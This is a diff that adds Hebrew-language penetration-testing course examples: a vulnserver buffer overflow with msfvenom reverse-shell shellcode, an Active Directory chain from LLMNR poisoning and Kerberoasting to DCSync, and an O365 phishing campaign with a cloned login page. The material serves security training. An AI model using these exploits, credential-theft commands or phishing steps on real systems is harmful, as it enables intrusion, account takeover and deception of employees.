@@ -137,6 +137,122 @@ nmap -sC -sV dev.company.com      # סביבת פיתוח חשופה, פורט 8
 
 ---
 
+## דוגמה 5 — Buffer Overflow מלא על vulnserver (מודול 10)
+
+**התרחיש:** שירות TCP פגיע (`vulnserver`) על פורט 9999. המטרה: Shell דרך גלישת חוצץ.
+
+### שלב 1 — Fuzzing (מציאת טווח הקריסה)
+```python
+# סקריפט ששולח כמות גדלה של A עד קריסה
+buf = "A" * 100
+while True:
+    s.send(("TRUN /.:/" + buf).encode()); buf += "A"*100
+# → קרס סביב 2000 בתים
+```
+
+### שלב 2 — מציאת ה-Offset
+```bash
+msf-pattern_create -l 3000        # דפוס ייחודי → שולחים, קוראים EIP
+msf-pattern_offset -l 3000 -q 386F4337
+# → Exact match at offset 2003
+```
+
+### שלב 3 — אימות שליטה ב-EIP
+```python
+buffer = b"A"*2003 + b"B"*4        # EIP צריך להראות 42424242 ✅
+```
+
+### שלב 4 — Bad Characters ו-JMP ESP
+```text
+!mona bytearray -b "\x00"          # השוואה → רק \x00 רע
+!mona find -s "\xff\xe4" -m essfunc.dll   # → 625011AF
+```
+
+### שלב 5 — Shellcode → Shell
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<kali> LPORT=4444 \
+  EXITFUNC=thread -b "\x00" -f python -v shellcode
+```
+```python
+buffer = b"A"*2003 + b"\xaf\x11\x50\x62" + b"\x90"*16 + shellcode
+```
+```bash
+nc -lvnp 4444   # מריצים את ה-exploit → C:\> whoami
+```
+
+**לקח:** BOF הוא **תהליך קבוע בן 7 שלבים**. הדיוק ב-Offset, ב-Bad Chars וב-Little-Endian הוא ההבדל בין כישלון להצלחה.
+
+---
+
+## דוגמה 6 — Active Directory: מ-Zero ל-Domain Admin (מודולים 8, 11, 13)
+
+**התרחיש:** בדיקה פנימית, חוברת ל-LAN **ללא אישורים**. המטרה: Domain Admin.
+
+### שלב 1 — LLMNR Poisoning (גישה ראשונית ללא אישורים)
+```bash
+sudo responder -I eth0 -dwv       # לוכד NTLMv2 hash של משתמש
+hashcat -m 5600 hash.txt rockyou.txt
+# → j.smith : Summer2021
+```
+
+### שלב 2 — Enumeration עם אישורים
+```bash
+crackmapexec smb <dc-ip> -u j.smith -p 'Summer2021' --users
+bloodhound-python -u j.smith -p 'Summer2021' -d corp.local -ns <dc-ip> -c All
+```
+
+### שלב 3 — Kerberoasting (הרחבת הרשאות)
+```bash
+GetUserSPNs.py corp.local/j.smith:'Summer2021' -dc-ip <dc-ip> -request
+hashcat -m 13100 tgs.txt rockyou.txt
+# → svc_sql : Password123!
+```
+
+### שלב 4 — BloodHound מראה נתיב + תנועה רוחבית
+```text
+BloodHound: svc_sql → AdminTo → FILE01 (יושב עליו session של Domain Admin)
+```
+```bash
+secretsdump.py corp.local/svc_sql:'Password123!'@FILE01   # → NTLM של DA
+```
+
+### שלב 5 — DCSync → השתלטות
+```bash
+secretsdump.py corp.local/DAuser@<dc-ip> -hashes :<DA-NTLM>
+# lsadump::dcsync → hash של Administrator → Domain Admin 🏆
+```
+
+**לקח:** שרשרת AD קלאסית: **LLMNR → Kerberoast → BloodHound → PtH → DCSync**. שים לב שכל שלב מזין את הבא, ושפיצוח סיסמאות (מודול 8) מופיע פעמיים.
+
+---
+
+## דוגמה 7 — פישינג → גישה פנימית (מודולים 15, 12, 13)
+
+**התרחיש:** בדיקה חיצונית בהרשאה. אין נקודת כניסה טכנית — נשתמש בגורם האנושי.
+
+### שלב 1 — OSINT
+```bash
+theHarvester -d corp.com -b all    # מיילים + מבנה first.last@corp.com
+# LinkedIn → 40 עובדים, טכנולוגיה: Office 365
+```
+
+### שלב 2 — קמפיין פישינג (GoPhish)
+```text
+Pretext: "מחלקת IT — מעבר ל-O365 חדש, התחבר לאימות"
+Landing Page: שבט של דף התחברות O365
+→ נשלח ל-40 עובדים; 6 הזינו סיסמה
+```
+
+### שלב 3 — שימוש בגישה
+```bash
+# אחת הסיסמאות עובדת ב-VPN → דריסת רגל ברשת הפנימית
+# משם: Pivoting (מודול 12) → Kerberoasting ו-AD (מודול 13)
+```
+
+**לקח:** ~90% מהפריצות מתחילות כך. **MFA** היה חוסם את שלב 3 גם עם סיסמה נכונה — ולכן הוא ההמלצה הקריטית ביותר בדוח (מודול 16).
+
+---
+
 ## מה משותף לכל הדוגמאות?
 
 1. **המתודולוגיה זהה** תמיד: Recon → Enumeration → חקר חולשה → ניצול → הוכחה.
